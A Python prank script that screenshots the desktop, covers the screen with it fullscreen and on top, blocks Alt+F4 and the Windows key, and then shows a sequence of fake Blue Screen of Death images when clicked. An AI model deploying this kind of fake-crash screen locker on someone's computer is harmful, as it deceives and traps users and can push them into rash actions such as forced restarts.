import tkinter as tk
import time
import pyautogui
import os, sys
from PIL import Image, ImageTk
import keyboard
import winsound

time.sleep(5)
dir = os.path.dirname(os.path.abspath(sys.argv[0]))
print(dir)
pyautogui.hotkey("win", "d")
time.sleep(0.7)
im = pyautogui.screenshot ('desktop.png')

root = tk.Tk()

root.geometry("{}x{}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))

bg = tk.PhotoImage(file="desktop.png")
bgimage = tk.Label(root, image=bg, width=root.winfo_screenwidth(),
                    height=root.winfo_screenheight(), borderwidth=0)
bgimage.place(x=0, y=0)

ISRUN = False
def toggle_geom(e):
    pass

def updateImg(number, sleepNum):

    imgName = dir+"/BSOD/bsod" + str(number) + ".png"
    img = Image.open(imgName).resize(
        (root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
    bg1 = ImageTk.PhotoImage(img)

    bgimage.configure(image=bg1, cursor='none')
    bgimage.image = bg1
    root.update()
    time.sleep(sleepNum)

def on_closing(event=None):
    print("Alt + F4 blocked!")
    return 'break'

root.bind('<Alt-F4>', on_closing)
keyboard.block_key("win")

def initiate(e):
    global ISRUN
    if ISRUN == False:
        ISRUN = True
        time.sleep(1)
        updateImg(1, 2)
        updateImg(2, 1)
        updateImg(3, 2)
        updateImg(4, 1)
        updateImg(5, 0.00000000000001)
        updateImg(6, 0.001)
        updateImg(7, 2)

bgimage.bind('<Button-1>', initiate)
root.attributes("-fullscreen", True)
root.bind('<Escape>', toggle_geom)
root.attributes('-topmost', True)
root.update()
root.mainloop()